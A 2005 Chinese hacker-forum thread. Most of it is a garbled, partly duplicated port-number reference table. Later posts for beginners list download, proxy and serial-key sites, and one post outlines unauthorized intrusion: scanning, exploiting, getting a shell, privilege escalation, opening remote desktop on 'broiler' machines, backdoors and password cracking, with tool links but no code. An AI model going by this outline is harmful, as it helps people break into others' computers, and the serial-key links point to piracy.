43　nicname　WhoIs　　　　"绰号"whois服务
44　mpm-flags　MPMFLAGSProtocol　　MPM(消息处理模块)标志协议
45　mpm　MessageProcessingModule[recv]　消息处理模块　
46　mpm-snd　MPM[defaultsend]　　　消息处理模块(默认发送口)
47　ni-ftp　NIFTP　　　　NIFTP
48　auditd　DigitalAuditDaemon　　数码音频后台服务49　tacacs　LoginHostProtocol(TACACS)　TACACS登录主机协议50　re-mail-ckRemoteMailCheckingProtocol　远程邮件检查协议[未结束]
51　la-maint　IMPLogicalAddressMaintenance　IMP(接口信息处理机)逻辑地址维护
52　xns-time　XNSTimeProtocol　　　施乐网络服务系统时间协议
53　domain　DomainNameServer　　　域名服务器
54　xns-ch　XNSClearinghouse　　　　施乐网络服务系统票据交换55　isi-gl　ISIGraphicsLanguage　　ISI图形语言
56　xns-auth　XNSAuthentication　　施乐网络服务系统验证
57　?　anyprivateterminalaccess　　预留个人用终端访问
58　xns-mail　XNSMail　　　　施乐网络服务系统邮件
59　anyprivatefileservice　　　预留个人文件服务
60　Unassigned　　　　　未定义
61　ni-mail　NIMAIL　　　　　NI邮件?
62　acas　ACAServices　　　　异步通讯适配器服务
63　whois+whois+　　　　　WHOIS+
64　covia　CommunicationsIntegrator(CI)　通讯接口　
65　tacacs-ds　TACACS-DatabaseService　　TACACS数据库服务
66　sql*net　OracleSQL*NET　　　OracleSQL*NET
67　bootps　BootstrapProtocolServer　　引导程序协议服务端
68　bootpc　BootstrapProtocolClient　　引导程序协议客户端
69　tftp　TrivialFileTransfer　　　小型文件传输协议
70　gopher　Gopher　　　　信息检索协议
71　netrjs-1　RemoteJobService　　远程作业服务
72　netrjs-2　RemoteJobService　　远程作业服务
73　netrjs-3　RemoteJobService　　远程作业服务
74　netrjs-4　RemoteJobService　　远程作业服务
75　anyprivatedialoutservice　　预留给个人拨出服务
76deos　DistributedExternalObjectStore分布式外部对象存储　
77　anyprivateRJEservice　　　预留给个人远程作业输入服务
78　vettcp　vettcp　　　　修正TCP?
79　finger　Finger　　　　查询远程主机在线用户等信息
80　http　WorldWideWebHTTP　　　　全球信息网超文本传输协议81　hosts2-ns　HOSTS2NameServer　　HOST2名称服务
82　xfer　XFERUtility　　　　传输实用程序
83　mit-ml-dev　MITMLDevice　　　　模块化智能终端ML设备
84　ctf　CommonTraceFacility　　　公用追踪设备
85　mit-ml-dev　MITMLDevice　　　　模块化智能终端ML设备
86　mfcobol　MicroFocusCobol　　　MicroFocusCobol编程语言
87　anyprivateterminallink　　预留给个人终端连接
88　kerberos　Kerberos　　　　Kerberros安全认证系统
89　su-mit-tg　SU/MITTelnetGateway　　SU/MIT终端仿真网关
90　dnsix　DNSIXSecuritAttributeTokenMap　DNSIX安全属性标记图91　mit-dov　MITDoverSpooler　　　MITDover假脱机
92　npp　NetworkPrintingProtocol　　网络打印协议
93　dcp　DeviceControlProtocol　　设备控制协议
94　objcall　TivoliObjectDispatcher　　Tivoli对象调度
95　supdup　SUPDUP　　　　
96　dixie　DIXIEProtocolSpecification　　DIXIE协议规范
97ft-rvfftRemoteVirturalFileProtocol）快速远程虚拟文件协议98　tacnews　TACNews　　　　　TAC新闻协议
99　metagram　MetagramRelay　　　　
100　newacct　[unauthorizeduse] 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:46am 

101=NICHostNameServer
102=ISO-TSAP
103=GenesisPoint-to-PointTransNet
104=ACR-NEMADigitalImag.&Comm.300
105=MailboxNameNameserver
106=3COM-TSMUX3com-tsmux
107=RemoteTelnetService
108=SNAGatewayAccessServer
109=PostOfficeProtocol-Version2
110=PostOfficeProtocol-Version3
111=SUNRPC
112=McIDASDataTransmissionProtocol
113=AuthenticationService
114=AudioNewsMulticast
115=SimpleFileTransferProtocol
116=ANSAREXNotify
117=UUCPPathService
118=SQLServicessqlserv
119=NetworkNewsTransferProtocol
120=CFDPTKTcfdptkt
121=EncoreExpeditedRemotePro.Call
122=SMAKYNETsmakynet
123=NetworkTimeProtocol
124=ANSAREXTrader
125=LocusPC-InterfaceNetMapSer
126=UnisysUnitaryLogin
127=LocusPC-InterfaceConnServer
128=GSSXLicenseVerification
129=PasswordGeneratorProtocol
130=ciscoFNATIVE
131=ciscoTNATIVE
132=ciscoSYSMAINT
133=StatisticsService
134=INGRES-NETService
135=LocationService
136=PROFILENamingSystem
137=NETBIOSNameService
138=NETBIOSDatagramService
139=NETBIOSSessionService
140=EMFISDataService
141=EMFISControlService
142=Britton-LeeIDM
143=InterimMailAccessProtocolv2
144=NewSnews
145=UAACProtocoluaac
146=ISO-IP0iso-tp0
147=ISO-IPiso-ip
148=CRONUS-SUPPORT
149=AED512EmulationService
150=SQL-NETsql-net
151=HEMShems
152=BackgroundFileTransferProgram
153=SGMPsgmp
154=NETSCnetsc-prod
155=NETSCnetsc-dev
156=SQLService
157=KNET/VMCommand/MessageProtocol
158=PCMailServerpcmail-srv
159=NSS-Routingnss-routing
160=SGMP-TRAPSsgmp-traps
161=SNMP
162=SNMPTRAP
163=CMIP/TCPManager
164=CMIP/TCPAgent
165=Xeroxxns-courier
166=SiriusSystems
167=NAMPnamp
168=RSVDrsvd
169=Send
170=NetworkPostScript
170=NetworkPostScript
171=NetworkInnovationsMultiplex
172=NetworkInnovationsCL/1
173=Xyplexxyplex-mux
174=MAILQ
175=VMNET
176=GENRAD-MUXgenrad-mux
177=XDisplayManagerControlProtocol
178=NextStepWindowServer
179=BorderGatewayProtocol
180=Intergraphris
181=Unifyunify
182=UnisysAuditSITP
183=OCBinderocbinder
184=OCServerocserver
185=Remote-KIS
186=KISProtocolkis
187=ApplicationCommunicationInterface
188=PlusFive’sMUMPS
189=QueuedFileTransport
189=QueuedFileTransport
190=GatewayAccessControlProtocol
190=GatewayAccessControlProtocol
191=ProsperoDirectoryService
191=ProsperoDirectoryService
192=OSUNetworkMonitoringSystem
193=srmp,SpiderRemoteMonitoringProtocol
194=irc,InternetRelayChatProtocl
195=DNSIXNetworkLevelModuleAudit
196=DNSIXSessionMgtModuleAuditRedir
197=DirectoryLocationService
198=DirectoryLocationServiceMonitor
199=SMUX
200=IBMSystemResourceController 

201=at-rtmpAppleTalkRoutingMaintenance
202=at-nbpAppleTalkNameBinding
203=at-3AppleTalkUnused
204=AppleTalkEcho
205=AppleTalkUnused
206=AppleTalkZoneInformation
207=AppleTalkUnused
208=AppleTalkUnused
209=TrivialAuthenticatedMailProtocol
210=ANSIZ39.50z39.50
211=TexasInstruments914C/GTerminal
212=ATEXSSTRanet
213=IPX
214=VMPWSCSvmpwscs
215=InsigniaSolutions
216=AccessTechnologyLicenseServer
217=dBASEUnix
218=NetixMessagePostingProtocol
219=UnisysARPsuarps
220=InteractiveMailAccessProtocolv3
221=BerkeleyrlogindwithSPXauth
222=BerkeleyrshdwithSPXauth
223=CertificateDistributionCenter
224=Reserved(224-241)
241=Reserved(224-241)
242=Unassigned#
243=SurveyMeasurement
244=Unassigned#
245=LINKlink
246=DisplaySystemsProtocol
247-255Reserved
256-343Unassigned
344=ProsperoDataAccessProtocol
345=PerfAnalysisWorkbench
346=Zebraserverzserv
347=FatmenServerfatserv
348=CabletronManagementProtocol
349-370Unassigned
371=Clearcaseclearcase
372=UnixListservulistserv
373=LegentCorporation
374=LegentCorporation
375=Hasslehassle
376=AmigaEnvoyNetworkInquiryProto
377=NECCorporation
378=NECCorporation
379=TIA/EIA/IS-99modemclient
380=TIA/EIA/IS-99modemserver
381=hpperformancedatacollector
382=hpperformancedatamanagednode
383=hpperformancedataalarmmanager
384=ARemoteNetworkServerSystem
385=IBMApplication
386=ASAMessageRouterObjectDef.
387=AppletalkUpdate-BasedRoutingPro.
388=UnidataLDMVersion4
389=LightweightDirectoryAccessProtocol
390=UISuis
391=SynOpticsSNMPRelayPort
392=SynOpticsPortBrokerPort
393=DataInterpretationSystem
394=EMBLNucleicDataTransfer
395=NETscoutControlProtocol
396=NovellNetwareoverIP
397=MultiProtocolTrans.Net.
398=Kryptolankryptolan
399=Unassigned#
400=WorkstationSolutions
401=UninterruptiblePowerSupply
402=GenieProtocol
403=decapdecap
404=ncednced
405=ncldncld
406=InteractiveMailSupportProtocol
407=Timbuktutimbuktu
408=ProsperoResourceManagerSys.Man.
409=ProsperoResourceManagerNodeMan.
410=DECLadebugRemoteDebugProtocol
411=RemoteMTProtocol
412=TrapConventionPort
413=SMSPsmsp
414=InfoSeekinfoseek
415=BNetbnet
416=Silverplattersilverplatter
417=Onmuxonmux
418=Hyper-Ghyper-g
419=Arielariel1
420=SMPTEsmpte
421=Arielariel2
422=Arielariel3
423=IBMOperationsPlanningandControlStart
424=IBMOperationsPlanningandControlTrack
425=ICADicad-el
426=smartsdpsmartsdp
427=ServerLocation
429=OCS_AMU
430=UTMPSDutmpsd
431=UTMPCDutmpcd
432=IASDiasd
433=NNSPnnsp
434=MobileIP-Agent
435=MobilIP-MN
436=DNA-CMLdna-cml
437=comscmcomscm
439=dasp,ThomasObermair
440=sgcpsgcp
441=decvms-sysmgtdecvms-sysmgt
442=cvc_hostdcvc_hostd
443=https
444=SimpleNetworkPagingProtocol
445=Microsoft-DS
446=DDM-RDBddm-rdb
447=DDM-RFMddm-dfm
448=DDM-BYTEddm-byte
449=ASServerMapper
450=TServertserver
512=exec,Remoteprocessexecution
513=login,remotelogin
514=cmd,execwithautoauth.
514=syslog
515=Printerspooler
516=Unassigned
517=talk
519=unixtime
520=extendedfilenameserver
521=Unassigned
522=Unassigned
523=Unassigned
524=Unassigned
526=newdate
530=rpccourier 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:47am 

端口详细说明表（下） 


531=chatconference
532=readnewsnetnews
533=foremergencybroadcasts
539=ApertusTechnologiesLoadDetermination
540=uucp
541=uucp-rlogin
542=Unassigned
543=klogin
544=kshell
545=Unassigned
546=Unassigned
547=Unassigned
548=Unassigned
549=Unassigned
550=new-who
551=Unassigned
552=Unassigned
553=Unassigned
554=Unassigned
555=dsf
556=remotefs
557-559=rmonitor
560=rmonitord
561=dmonitor
562=chcmd
563=Unassigned
564=plan9fileservice
565=whoami
566-569Unassigned
570=demonmeter
571=udemonmeter
572-599Unassignedipcserver
600=SunIPCserver
607=nqs
606=CrayUnifiedResourceManager
608=Sender-Initiated/UnsolicitedFileTransfer
609=npmp-trapnpmp-trap
610=npmp-localnpmp-local
611=npmp-guinpmp-gui
634=ginadginad
666=DoomIdSoftware
704=errlogcopy/serverdaemon
709=EntrustManager
729=IBMNetViewDM/6000Server/Client
730=IBMNetViewDM/6000send/tcp
731=IBMNetViewDM/6000receive/tcp
741=netGWnetgw
742=NetworkbasedRev.Cont.Sys.
744=FlexibleLicenseManager
747=FujitsuDeviceControl
748=RussellInfoSciCalendarManager
749=kerberosadministration
751=pump
752=qrh
754=send
758=nlogin
759=con
760=ns
762=quotad
763=cycleserv
765=webster
767=phonephonebook
769=vid
771=rtip
772=cycleserv2
774=acmaint_dbd
775=acmaint_transd
780=wpgs
786=Concertconcert
800=mdbs_daemon
996=CentralPointSoftware
997=maitrd
999=puprouter 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:47am 

1023=Reserved
1024=Reserved
1025=networkblackjack
1030=BBNIAD
1031=BBNIAD
1032=BBNIAD
1067=InstallationBootstrapProto.Serv.
1068=InstallationBootstrapProto.Cli.
1080=SOCKS
1083=AnasoftLicenseManager
1084=AnasoftLicenseManager
1155=NetworkFileAccess
1222=SNIR&Dnetwork
1248=hermes
1346=AltaAnalyticsLicenseManager
1347=multimediaconferencing
1347=multimediaconferencing
1348=multimediaconferencing
1349=RegistrationNetworkProtocol
1350=RegistrationNetworkProtocol
1351=DigitalToolWorks(MIT)
1352=/LotusNotelotusnote
1353=ReliefConsulting
1354=RightBrainSoftware
1355=IntuitiveEdge
1356=CuillaMartinCompany
1357=ElectronicPegBoard
1358=CONNLCLIconnlcli
1359=FTSRVftsrv
1360=MIMERmimer
1361=LinX
1362=TimeFliestimeflies
1363=NetworkDataMoverRequester
1364=NetworkDataMoverServer
1365=NetworkSoftwareAssociates
1366=NovellNetWareCommServicePlatform
1367=DCSdcs
1368=ScreenCastscreencast
1369=GlobalViewtoUnixShell
1370=UnixShelltoGlobalView
1371=FujitsuConfigProtocol
1372=FujitsuConfigProtocol
1373=Chromagrafxchromagrafx
1374=EPISoftwareSystems
1375=Bytexbytex
1376=IBMPersontoPersonSoftware
1377=CichlidLicenseManager
1378=ElanLicenseManager
1379=IntegritySolutions
1380=TelesisNetworkLicenseManager
1381=AppleNetworkLicenseManager
1382=udt_os
1383=GWHannawayNetworkLicenseManager
1384=ObjectiveSolutionsLicenseManager
1385=AtexPublishingLicenseManager
1386=CheckSumLicenseManager
1387=ComputerAidedDesignSoftwareIncLM
1388=ObjectiveSolutionsDataBaseCache
1389=DocumentManager
1390=StorageController
1391=StorageAccessServer
1392=PrintManagericlpv-pm
1393=NetworkLogServer
1394=NetworkLogClient
1395=PCWorkstationManagersoftware
1396=DVLActiveMail
1397=AudioActiveMail
1398=VideoActiveMail
1399=CadkeyLicenseManager
1400=CadkeyTabletDaemon
1401=GoldleafLicenseManager
1402=ProsperoResourceManager
1403=ProsperoResourceManager
1404=InfiniteGraphicsLicenseManager
1405=IBMRemoteExecutionStarter
1406=NetLabsLicenseManager
1407=DBSALicenseManager
1408=SophiaLicenseManager
1409=HereLicenseManager
1410=HiQLicenseManager
1411=AudioFileaf
1412=InnoSysinnosys
1413=Innosys-ACLinnosys-acl
1414=IBMMQSeriesibm-mqseries
1415=DBStardbstar
1416=NovellLU6.2novell-lu6.2
1417=TimbuktuService1Port
1417=TimbuktuService1Port
1418=TimbuktuService2Port
1419=TimbuktuService3Port
1420=TimbuktuService4Port
1421=GandalfLicenseManager
1422=AutodeskLicenseManager
1423=EssbaseArborSoftware
1424=HybridEncryptionProtocol
1425=ZionSoftwareLicenseManager
1426=Satellite-dataAcquisitionSystem1
1427=mloaddmonitoringtool
1428=InformatikLicenseManager
1429=HypercomNMSnms
1430=HypercomTPDUtpdu
1431=ReverseGosipTransport
1432=BlueberrySoftwareLicenseManager
1433=Microsoft-SQL-Server
1434=Microsoft-SQL-Monitor
1435=IBMCISCibm-cics
1436=Satellite-dataAcquisitionSystem2
1437=Tabulatabula
1438=EiconSecurityAgent/Server
1439=EiconX25/SNAGateway
1440=EiconServiceLocationProtocol
1441=CadisLicenseManagement
1442=CadisLicenseManagement
1443=IntegratedEngineeringSoftware
1444=MarcamLicenseManagement
1445=ProximaLicenseManager
1446=OpticalResearchAssociatesLicenseManager
1447=AppliedParallelResearchLM
1448=OpenConnectLicenseManager
1449=PEportpeport
1450=TandemDistributedWorkbenchFacility
1451=IBMInformationManagement
1452=GTEGovernmentSystemsLicenseMan
1453=GenieLicenseManager
1454=interHDLLicenseManager
1454=interHDLLicenseManager
1455=ESLLicenseManager
1456=DCAdca
1457=ValisysLicenseManager
1458=NicholsResearchCorp.
1459=ProshareNotebookApplication
1460=ProshareNotebookApplication
1461=IBMWirelessLAN
1462=WorldLicenseManager
1463=Nucleusnucleus
1464=MSLLicenseManager
1465=PipesPlatform
1466=OceanSoftwareLicenseManager
1467=CSDMBASEcsdmbase
1468=CSDMcsdm
1469=ActiveAnalysisLimitedLicenseManager
1470=UniversalAnalytics
1471=csdmbasecsdmbase
1472=csdmcsdm
1473=OpenMathopenmath
1474=Telefindertelefinder
1475=TaligentLicenseManager
1476=clvm-cfgclvm-cfg
1477=ms-sna-server
1478=ms-sna-base
1479=dberegisterdberegister
1480=PacerForumpacerforum
1481=AIRSairs
1482=MiteksysLicenseManager
1483=AFSLicenseManager
1484=ConfluentLicenseManager
1485=LANSourcelansource
1486=nms_topo_serv
1487=LocalInfoSrvr
1488=DocStordocstor
1489=dmdocbrokerdmdocbroker
1490=insitu-confinsitu-conf
1491=anynetgateway
1492=stone-design-1
1493=netmap_lmnetmap_lm
1494=icaica
1495=cvccvc
1496=liberty-lmliberty-lm
1497=rfx-lmrfx-lm
1498=Watcom-SQLwatcom-sql
1499=FedericoHeinzConsultora
1500=VLSILicenseManager
1501=Satellite-dataAcquisitionSystem3
1502=Shivashivadiscovery
1503=Databeamimtc-mcs
1504=EVBSoftwareEngineeringLicenseManager
1505=FunkSoftware,Inc.
1524=ingres
1525=oracle
1525=ProsperoDirectoryServicenon-priv
1526=ProsperoDataAccessProtnon-priv
1527=oracletlisrv
1529=oraclecoauthor
1600=issd
1651=proshareconfaudio
1652=proshareconfvideo
1653=proshareconfdata
1654=proshareconfrequest
1655=proshareconfnotify
1661=netview-aix-1netview-aix-1
1662=netview-aix-2netview-aix-2
1663=netview-aix-3netview-aix-3
1664=netview-aix-4netview-aix-4
1665=netview-aix-5netview-aix-5
1666=netview-aix-6netview-aix-6
1986=ciscolicensemanagement
1987=ciscoRSRBPriority1port
1988=ciscoRSRBPriority2port
1989=ciscoRSRBPriority3port
1989=MHSnetsystemmshnet
1990=ciscoSTUNPriority1port
1991=ciscoSTUNPriority2port
1992=ciscoSTUNPriority3port
1992=IPsendmsgipsendmsg
1993=ciscoSNMPTCPport
1994=ciscoserialtunnelport
1995=ciscoperfport
1996=ciscoRemoteSRBport
1997=ciscoGatewayDiscoveryProtocol
1998=ciscoX.25service(XOT)
1999=ciscoidentificationport
2009=whosockami
2010=pipe_server
2011=raid
2012=raid-ac
2013=rad-am
2015=raid-cs
2016=bootserver
2017=terminaldb
2018=rellpack
2019=about
2019=xinupageserver
2020=xinupageserver
2021=xinuexpansion1
2021=down
2022=xinuexpansion2
2023=xinuexpansion3
2023=xinuexpansion4
2024=xinuexpansion4
2025=xribs
2026=scrabble
2027=shadowserver
2028=submitserver
2039=device2
2032=blackboard
2033=glogger
2034=scoremgr
2035=imsldoc
2038=objectmanager
2040=lam
2041=interbase
2042=isis
2043=isis-bcast
2044=primsl
2045=cdfunc
2047=dls
2048=dls-monitor
2065=DataLintchReadPortNumber
2067=DataLintchWritePortNumber
2201=AdvancedTrainingSystemProgram
2500=ResourceTrackingsystemserver
2501=ResourceTrackingsystemclient
2564=HP3000NS/VTblockmodetelnet
2784=worldwideweb-development
3049=ccmail
3264=ccmail,cc:mail/lotus
3333=dec-notes
3984=MAPPERnetworknodemanager
3985=MAPPERTCP/IPserver
3986=MAPPERworkstationserver
3421=BullAppriseportmapper
3900=UnidataUDTOS
4132=NUTSDaemonnuts_dem
4133=NUTSBootpServer
4343=UNICALL
4444=KRB524
4672=remotefileaccessserver
5002=radiofreeethernet
5010=TelepathStarttelelpathstart
5011=TelepathAttack
5050=multimediaconferencecontroltool
5145=rmonitor_secure
5190=aol,America-Online
5300=HAclusterheartbeat
5301=hacl-gs#HAclustergeneralservices
5302=HAclusterconfiguration
5303=hacl-probeHAclusterprobing
5305=hacl-test
6000-6063=x11XWindowSystem
6111=sub-processHPSoftBenchSub-ProcessControl
6141/=meta-corpMetaCorporationLicenseManager
6142=aspentec-lmAspenTechnologyLicenseManager
6143=watershed-lmWatershedLicenseManager
6144=statsci1-lmStatSciLicenseManager-1
6145=statsci2-lmStatSciLicenseManager-2
6146=lonewolf-lmLoneWolfSystemsLicenseManager
6147=montage-lmMontageLicenseManager
7000=afs3-fileserverfileserveritself
7001=afs3-callbackcallbackstocachemanagers
7002=afs3-prserverusers&groupsdatabase
7003=afs3-vlservervolumelocationdatabase
7004=afs3-kaserverAFS/Kerberosauthenticationservice
7005=afs3-volservolumemanagmentserver
7006=afs3-errorserrorinterpretationservice
7007=afs3-bosbasicoverseerprocess
7008=afs3-updateserver-to-serverupdater
7009=afs3-rmtsysremotecachemanagerservice
7010=ups-onlineonlinetuninterruptablepowersupplies
7100=XFontService
7200=FODMSFLIP
7626=冰河
8010=Wingate
8181=IMail
9535=man
45576=E代时光专业代理端口 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:48am 

org菜鸟进阶（1） 

常用类软件： 
黑白屋： http://www.play8.net/ 
华军软件 http://www.newhua.com/ （根据物理位置自行选择速度快的镜像） 
中国下载 http://download.com.cn/ （使用查找功能可找到大部份软件） 
东丽在线 http://www.tjdl.net/softdown/ （不错的软件下载站，类似华军） 
世纪下载 http://www.21sx.com/ （也是一个不错的下载站） 
安全类软件： 
黑白屋：http://www.play8.net/index2.htm 
安全焦点 http://www.xfocus.net/tool.php 
安全资讯 http://www.aurorasafe.com/list.asp 
天天安全 http://www.ttian.net/download/list.php 
网嗅下载 http://netsill.com/download/default.asp 
灰色轨迹 http://www.sandflee.net/down/list.asp 
鹰派下载 http://211.155.27.112/~technic/down/ 
（一些大型精典安全软件下载，不过有时候就上不去） 


找代理在这里： 
代理使用方法 http://extend.hk.hi.cn/~sunbird/freeproxy_why.html 
（各种代理使用方法介绍） 
代理服务器地址 http://www.salala.com/proxy_index.htm 
（每日更新的，大部份是HTTP代理） 
代理服务器地址 http://www.emaga.net/8341/myann 
（每日更新的，大部份是SOCKS代理，既QQ代理） 

注册码在这里： 
第六空间 http://www.sixthroom.com/down/qt/ser.rar （注册码大全下载） 
注册码搜索 http://www.netpaste.com/code/ 
孤月注册码 http://www.guyue.com/key/ 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:48am 

菜鸟进阶（2） 


关于被入侵 



简单说明： 
经常有帖子说：“我中木马啦，怎么办？”、“我被攻击了”，“我的windows有问题，是不是被入侵啦？”等等。哪么如果你怀疑系统被入侵的话，请你首先看看日志的记录或是有什么变化，然后你应该查看可疑进程（win98需要用相关工具）、注册表启动项、服务、开放端口等，然后更新病毒库，杀毒。前提是你要有一定的电脑常识并对你的系统比较了解，才能分别正常与否。如果你自己对电脑一窍不通，那在论坛别人也很难帮助你。其实就像对付现实中的病毒一样，应该预防为主。杀毒软件和网络防火墙可以抵御绝大部分危险，自身安全知识的提高则是最根本的保障。最新的病毒相关知识可以到杀毒软件公司的主页上找。另外，系统不正常也可能是操作失误引起的。这里不是“电脑零起点”，所以关于系统修复的问题，请不要在论坛提了。 


相关工具： 

Active Ports 监视自己电脑的端口，并做出相应处理。http://www.sixthroom.com/down/aq/cn_aports.rar 
windows优化大师5.1 它的进程管理功能不错。更是目前最好的系统优化软件。 http://www.sixthroom.com/down/aq/wom.rar 
Windows 基准安全分析器 1.0 （特别推荐，详细资料看下载说明吧） 
http://www.sixthroom.com/down/admin/aq/mbsasetup.msi 
Fport-2.0 查看端口关联的进程 （应用于9x/me）http://www.sixthroom.com/down/admin/aq/fport.zip 
mport 比fport更胜一筹的工具 http://www.sixthroom.com/down/admin/aq/mport.zip 
KV3000江民杀毒王（正式版＋钥匙盘） 
http://www.kxweb.net/down/down.asp?downid=1&id=14 
金山毒霸2003正式版 
http://www.kxweb.net/down/down.asp?downid=1&id=11 


相关资料： 

黑白屋文档中心：http://www.play8.net/cgi-bin/news/article/list.cgi 
104种木马的清除方法http://asp2.6to23.com/ebug88/net/article/net004.htm 
清除恶意网页的破坏 http://assistant.3721.com/safe.htm 
2000系统进程总列表 http://sinbad.zhoubin.com/read.html?board=Win&num=73 
木马的检测、清除及其预防 天网安全检测 http://sky.net.cn/main/view.php?cid=170 
蓝盾安全检测 http://www.bluedon.com/bluedonserver.asp 

菜鸟进阶（3） 


基础知识和入侵步骤 


简单说明： 
电脑和网络知识可算是做黑客的基础的基础，至少你要先了解了它们再来看下面的文章。看完这部分的文章，你也只是算站到了门口，路还长着呢。这里我再多说几句关于入侵步骤的话，给新手做个引导。所谓入侵，可以理解为未授权的访问。既然是未授权的，就需要借助一些非常规的手段，即通常所说的利用漏洞。 
基础知识网址： 
http://tech.163.com/tm/010213/010213_14563.html 
http://tech.163.com/tm/010213/010213_14564.html 
http://tech.163.com/tm/010214/010214_14632.html 
http://tech.163.com/tm/010214/010214_14634.html 
http://tech.163.com/tm/010214/010214_14638.html 

一、要利用漏洞首先要发现它。端口扫描和漏洞扫描就是“敲门砖”。可以对大量目标做一般扫描，也可以对单一目标做重点扫描。或者两者结合。当你对漏洞熟悉时，你可以只通过端口扫描就能了解目标的可能有的漏洞。这样既提高效率又不易被记录日志。 
几种扫描器的简单使用教程：http://www.chinesehack.org/file/show.asp?id=5614 
入侵技术介绍--目标探测：http://www.sixthroom.com/ailan/f ... 2&RootID=279&ID=279 

二、找到漏洞后的利用问题，是千差万别的。这正是新手学要学习的地方之一。很多要依靠自己的知识积累及对系统的掌握及熟悉程度，这里就不多说了。 下面提供几个提供漏洞资料的网站供大家参考。 
天极网 http://www.myhard.com/76284138209935360/index.shtml 
绿盟科技 http://www.nsfocus.net/index.php?act=sec_bug 
五月安全网 http://bgbbs.www70.cn4e.com/article.asp?cat_id=2 
中国信息安全 http://www.chinafirst.org.cn/ruodian/advisory.php 

三、利用漏洞的目的是什么呢？是控制对方，即是获得远程shell。shell这个概念是从UNIX下继承过来的，是指与操作系统核心的一种交互方式和界面。典型的例子是telnet。得到shell的办法有很多种，比如通过系统自带的telnet，终端服务。或者用木马和工具提供的，如winshell，冰河等等。以下介绍两篇SHELL编程的文章给大家。 
中国软件 http://www.csdn.net/develop/article/14/14219.shtm 
程序春秋 http://www.cbinews.com/developer/showconte...?articleid=2193 

四、shell是有权限差别的。最高权限--管理员权限才是我们的目标。所以有时会有提升权限的问题。当然，这也是利用了漏洞。以下介绍几篇文章。 
Win2K 提升权限漏洞 
http://www.yesky.com/20010530/182273.shtml 
Microsoft SQL Server Webtasks权限提升漏洞 
http://it.rising.com.cn/newSite/ ... 10/31-153502052.htm 
Linux kernel ptrace提升权限漏洞 
http://levinstorm.myetang.com/main/holes/unix/005.html 
NT/2000提升权限的方法小结 
http://home.lufeng.net/wolf/Computer/luodong/2000tisheng.htm 
IIS提升权限漏洞 
http://www.ddhome.net/hole/14.htm 

五、有了shell还要扩大它，就是进一步获得更好用的shell。命令行的到图形的、功能少的到多的。于是才有了“怎么开3389”，“怎么上传”之类问题。在这介绍给大家介绍一下现在最流行的3389吧。更多的文章请www.sixthroom.com。 
远程开启3389终端服务 
http://www.sandflee.net/wawa/3389-1.htm 
建立你的3389肉鸡 
http://www.sandflee.net/wawa/sz-3389.htm 

六、为了下次还能控制目标，你需要保持shell。做一个好的后门又是一种“学问”。克隆帐号、埋木马、破administrator的密码，手段不一而足。各位慢慢学吧。 
永远的后门 http://www.ttian.net/article/show.php?id=259 
Win2000 下Ping 后门的简单实现 
http://www.landun.org/wenzhang/images/xiao...rticle/154.html 
帐号克隆 
http://www.netXeyes.org/CA.exe 
帐号检查 
http://www.netXeyes.org/CCA.exe 
暴力破解LC4 
http://www.andyxu.net/banana/tools_2/lc4.rar 

端口知识介绍： 
相关工具： 
扫描端口是扫描器的基本功能，工具太多了。提供两个给大家，更多的参看后面。 
X-Port.zip下载 http://www.xfocus.net/download.php?id=327 
PortReady下载 http://dotpot.533.net/dpsoft/PortReady1.6.zip 
相关资料： 
端口扫描简介 http://www.netscreen.com.cn/suml/zhishiyy/.../duankougj.htm0 
系统服务及木马默认端口表 
http://www.pttc.yn.cninfo.net/dtsy/nettech...an/41250634.htm 
端口大全 http://www.sixthroom.com/ailan/f ... 2&RootID=268&ID=268 
常用默认端口列表及功能中文注解 http://www.sixthroom.com/ailan/f ... 2&RootID=267&ID=267 
常见端口详解及部分攻击策略 http://www.sixthroom.com/ailan/f ... 2&RootID=266&ID=266 
相关资料： 
如何成为一名黑客 http://263.aka.org.cn/Docs/hacker-howto_2001.html 
提问的技巧 http://bbs.online.sh.cn/eliteart ... 44fb3b6efa4377e48ae 
TCP/IP基础 http://www.linkwan.com/gb/routertech/netbase/tcpip.htm 
网络攻防教程 http://www.netsill.com/wenzhang/list.asp?id=115 
网络入侵步骤及思路 http://www.iamguo.com/bh3/hackguide2.htm 
拒绝背后黑手的窥探 IPC$漏洞大揭秘 
http://computer.szptt.net.cn/2002-04-27/nw...042700109.shtml 
全球ip分配表 http://519519.vicp.net/lb5000//usr/3/3_11.txt 
黑客入门教程 http://www.pttc.yn.cninfo.net/dtsy/nettech...an/43934529.htm 
菜鸟XXX客快速入门 
http://netsafe.ayinfo.ha.cn/sqxw/2002117172333.htm 
几种流行的入侵工具与讲解 
http://www.pttc.yn.cninfo.net/dtsy/nettech...an/44188520.htm 
常见端口详解及部分攻击策略 
http://www.pttc.yn.cninfo.net/dtsy/nettech...quan/-90637.htm 
攻击的各种级别
http://www.pttc.yn.cninfo.net/dtsy/nettech...an/39825935.htm 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:49am 

菜鸟进阶（4） 

关于命令的使用 

简单说明： 
windowsNT/2000下有丰富的cmd可供使用，其作用也是巨大的。完全值得去熟练掌握她它们。windows2000本身就提供了详细的命令帮助。在开始菜单--》帮助中可以搜索到“windows 2000 命令参考”。强烈建议各位新手花些时间仔细看一遍。装了比如IIS等软件，就会有新的命令（iisreset），在命令行方式下加/?或-h参数可以查看帮助，其他内置的命令当然也可以。还有就是掌握一些常用的DOS命令也是非常有必要的。因为WINSOWS不管发展到哪一天，它也都不可能取代DOS，至少现在还不行。NET命令更是最常用的网络命令，想做一个黑客，更是你所必需掌握的。掌握一些LINUX命令也是很有必要的。希望下面的资料对大家有所帮助。 

相关帖子： 
DOS下常用网络相关命令解释 
http://www.jiejingwang.com/list.asp?id=521 
入门网络命令 
http://www.jiejingwang.com/list.asp?id=520 
Win2000命令全集 http://www.sixthroom.com/ailan/f ... 2&RootID=343&ID=343 
Windows XP下cmd命令详解 http://www.sixthroom.com/ailan/f ... 2&RootID=366&ID=366 
ftp命令： http://www.hotcy.org/chem/campous/article/ftp.htm 
